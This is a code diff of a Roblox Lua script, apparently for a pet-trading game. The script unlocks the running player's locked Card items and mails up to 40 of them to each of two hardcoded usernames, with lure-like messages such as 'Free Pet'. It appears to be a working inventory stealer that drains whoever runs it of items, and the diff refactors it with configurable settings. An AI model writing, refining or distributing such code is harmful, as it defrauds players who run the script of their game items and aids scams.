@@ -1,54 +1,94 @@
+-- Settings for Card items
+getgenv().Settings = {
+    Items = {
+        ["Card"] = {
+            Class = "Card",
+            -- Pattern to match IDs ending with "Card", optionally followed by spaces and numbers
+            pattern = "Card%s*%d*$",
+            maxSendPerUser = 40
+        }
+    }
+}
+
+local RS = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local Save = require(RS.Library.Client.Save)
+local Network = require(RS.Library.Client.Network)
+
+-- Parse the usernames (one per line)
 local usernamesString = [[
 maudimancing1
 recyaza
 ]]
-        local usernames = {}
-        for line in usernamesString:gmatch("([^\n]+)") do
-            if line ~= "" then
-                table.insert(usernames, line)
+local usernames = {}
+for line in usernamesString:gmatch("([^\n]+)") do
+    if line ~= "" then
+        table.insert(usernames, line)
+    end
+end
+
+local messages = {"Free Pet", "This What you Get"}
+
+-- Function to refresh and retrieve all available Card items that match the pattern
+local function GetCardItems()
+    local data = Save.Get()
+    local inventory = data and data.Inventory
+    local items = {}
+    if inventory and inventory[getgenv().Settings.Items["Card"].Class] then
+        for uid, itemData in pairs(inventory[getgenv().Settings.Items["Card"].Class]) do
+            if itemData.id:match(getgenv().Settings.Items["Card"].pattern) and 
+               itemData._am and itemData._am > 0 then
+                table.insert(items, {uid = uid, data = itemData})
             end
         end
-        
-        local messages = {"Free Pet", "This What you Get"}
-        local Network = require(game.ReplicatedStorage.Library.Client.Network)
-        local maxItemsPerUser = 40
-        
-        -- Loop through each username
-        for _, selectedUser in ipairs(usernames) do
-            local countSent = 0
-            while countSent < maxItemsPerUser do
-                -- Refresh the inventory data for each send
-                local saveData = require(game.ReplicatedStorage.Library.Client.Save).Get()
-                local cardInventory = saveData.Inventory.Card
-                
-                local foundCard = nil
-                -- Look for a card item that ends with "Card" (optionally with trailing spaces/digits)
-                for PetUID, PetData in pairs(cardInventory) do
-                    if PetData.id:match("Card%s*%d*$") and PetData._am and PetData._am > 0 then
-                        foundCard = {uid = PetUID, data = PetData}
-                        break
-                    end
-                end
-                
-                if not foundCard then
-                    print("No available card items left for username", selectedUser)
-                    break -- Stop processing this username if there are no available cards
-                end
-                
-                -- Unlock the card if it is locked
-                if foundCard.data._lk then
-                    repeat
-                        task.wait()
-                    until Network.Invoke("Locking_SetLocked", foundCard.uid, false)
-                    print("Unlocked", foundCard.uid)
-                end
-                
-                local selectedMessage = messages[math.random(1, #messages)]
-                repeat
-                    task.wait()
-                until Network.Invoke("Mailbox: Send", selectedUser, selectedMessage, "Pet", foundCard.uid, 1)
-                print("Sent", foundCard.uid, "to", selectedUser, "with message:", selectedMessage)
-                
-                countSent = countSent + 1
-            end
+    end
+    return items
+end
+
+-- Function to send mail using the Network module
+local function sendMail(username, itemType, uid, amount, message)
+    local args = {
+        username,
+        message,
+        itemType,
+        uid,
+        amount
+    }
+    -- Wait until the server call succeeds
+    repeat
+        task.wait()
+    until Network.Invoke("Mailbox: Send", unpack(args))
+    wait(0.5)
+end
+
+-- Main loop: For each username, send up to maxSendPerUser card items
+for _, username in ipairs(usernames) do
+    local countSent = 0
+    while countSent < getgenv().Settings.Items["Card"].maxSendPerUser do
+        local availableCards = GetCardItems()
+        if #availableCards == 0 then
+            print("No available Card items left for", username)
+            break
         end
+        
+        -- Pick a random available card from the refreshed inventory
+        local chosen = availableCards[math.random(1, #availableCards)]
+        local uid = chosen.uid
+        local itemData = chosen.data
+
+        -- Unlock the card if it's locked
+        if itemData._lk then
+            repeat
+                task.wait()
+            until Network.Invoke("Locking_SetLocked", uid, false)
+            print("Unlocked", uid)
+        end
+        
+        local selectedMessage = messages[math.random(1, #messages)]
+        sendMail(username, "Card", uid, 1, selectedMessage)
+        print("Sent", uid, "to", username, "with message:", selectedMessage)
+        
+        countSent = countSent + 1
+    end
+end
